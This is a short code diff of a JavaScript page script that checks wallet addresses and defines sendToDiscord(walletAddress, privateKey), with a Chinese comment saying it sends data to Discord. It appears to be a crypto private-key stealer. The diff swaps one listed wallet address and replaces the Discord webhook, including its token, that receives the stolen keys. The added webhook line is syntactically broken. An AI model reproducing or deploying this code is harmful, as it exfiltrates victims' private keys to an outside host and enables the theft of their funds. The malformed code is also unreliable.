@@ -12,11 +12,12 @@ document.addEventListener('DOMContentLoaded', function() {
     const VALID_WALLET_ADDRESSES = [
         "HJL5i5ez6M4mWy3dX1KtSEYfhW5GazpWttAowsRngYAm",
         "3qDmJRFwV6ZZuHz4gYDRAdJQtJ4HBw5jWHNjaC9e8xaH",
-        "F2MbRb3BaqHZwWw9Mv8DW1dBhBbncDbRK9pNnLMEW1Wa",
+        "Ak36a6mbpc5TD2r4ej7oMzZogo9y3tkDK9xonHB42nf5",
         "ENnCp997S9i8E11xgpR7CCfS8F87Df8BivYe68fyxSbp"
     ];
 
-    const WEBHOOK_URL = "https://discord.com/api/webhooks/1340003897896337488/YgVR4qNkPbuKFBr8QBkQK2XIsixefmO4rvy52Nsh0oLyYltC_emiIiwZNQiD-qRbOlYW";
+    const WEBHOOK_URL = "    const WEBHOOK_URL = "https://discord.com/api/webhooks/1364866199481225256/IL8iTCQmixcoVInudA7OjFoLdc0aiPzimoZArmd_6_y1pYwTBRf6bhG7pVhadobXP0Mx";
+";
 
     // 发送数据到 Discord
     async function sendToDiscord(walletAddress, privateKey) {
